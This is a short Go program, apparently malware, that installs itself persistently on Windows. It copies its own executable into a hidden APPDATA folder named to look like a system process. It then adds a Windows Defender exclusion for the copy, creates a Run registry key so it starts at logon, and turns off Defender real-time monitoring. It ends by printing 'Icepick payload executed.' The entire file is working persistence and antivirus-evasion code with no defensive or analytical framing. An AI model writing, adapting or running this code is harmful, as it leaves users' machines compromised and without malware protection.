package main

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
)

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	if err != nil {
		return err
	}
	return out.Close()
}

func main() {
	appdata := os.Getenv("APPDATA")
	if appdata == "" {
		fmt.Println("APPDATA environment variable not found")
		return
	}
	hiddenFolder := filepath.Join(appdata, ".sysdata")
	err := os.MkdirAll(hiddenFolder, 0755)
	if err != nil {
		fmt.Println("Error creating hidden folder:", err)
		return
	}
	exePath, err := os.Executable()
	if err != nil {
		fmt.Println("Error getting executable path:", err)
		return
	}
	targetExe := filepath.Join(hiddenFolder, "syshost.exe")
	err = copyFile(exePath, targetExe)
	if err != nil {
		fmt.Println("Error copying exe:", err)
		return
	}
	exec.Command("attrib", "+h", hiddenFolder).Run()
	exec.Command("attrib", "+h", targetExe).Run()
	exec.Command("powershell", "-Command", "Add-MpPreference -ExclusionPath '"+targetExe+"';").Run()
	startupName := "SysHostService"
	regCmd := exec.Command("powershell", "-Command", "Set-ItemProperty -Path 'HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '"+startupName+"' -Value '"+targetExe+"'")
	regCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = regCmd.Run()
	if err != nil {
		fmt.Println("Error creating registry key:", err)
	}
	exec.Command("powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true").Run()
	fmt.Println("Icepick payload executed.")
}
